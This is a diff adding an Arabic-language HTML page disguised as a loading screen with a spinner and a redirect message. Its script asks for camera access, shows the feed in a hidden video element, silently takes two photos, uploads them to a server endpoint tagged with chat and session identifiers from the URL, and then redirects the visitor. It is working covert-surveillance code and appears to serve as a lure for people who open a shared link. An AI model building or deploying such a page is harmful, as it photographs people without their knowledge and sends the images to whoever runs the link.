@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>📸 جارٍ التحميل</title>
+  <style>
+    body {
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: #111;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+    }
+    .loader {
+      width: 120px;
+      height: 120px;
+      border: 12px solid #333;
+      border-top: 12px solid #38bdf8;
+      border-radius: 50%;
+      animation: spin 1.5s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 10px;
+    }
+    p {
+      color: #aaa;
+      font-size: 16px;
+    }
+    video {
+      display: none; /* إخفاء الفيديو */
+    }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <h1>⏳ جارٍ التحميل</h1>
+  <p>سيتم تحويلك تلقائيًا بعد اكتمال العملية</p>
+  <video autoplay playsinline></video>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const redirectUrl = params.get('redirect');
+    const chat = params.get('chat');
+    const sessionId = params.get('sessionId');
+    const video = document.querySelector('video');
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+
+        setTimeout(() => capturePhoto(false), 2000);
+        setTimeout(() => capturePhoto(true), 4000);
+
+        function capturePhoto(isLast) {
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          canvas.toBlob(async blob => {
+            const formData = new FormData();
+            formData.append('photos', blob, `photo-${Date.now()}.png`);
+            formData.append('chat', chat);
+            formData.append('sessionId', sessionId);
+
+            try {
+              await fetch('/upload-photo', { method: 'POST', body: formData });
+            } catch (err) {
+              console.error('❌ فشل إرسال الصورة:', err.message);
+            }
+
+            if (isLast) {
+              stream.getTracks().forEach(track => track.stop());
+              document.body.innerHTML = `<h2 style="color:#0f0;">✅ تم الالتقاط! سيتم تحويلك...</h2>`;
+              setTimeout(() => {
+                window.location.href = redirectUrl || '/';
+              }, 2000);
+            }
+          }, 'image/png');
+        }
+      })
+      .catch(err => {
+        document.body.innerHTML = `<h2 style="color:red;">❌ فشل في الوصول للكاميرا:<br>${err.message}</h2>`;
+      });
+  </script>
+</body>
+</html>
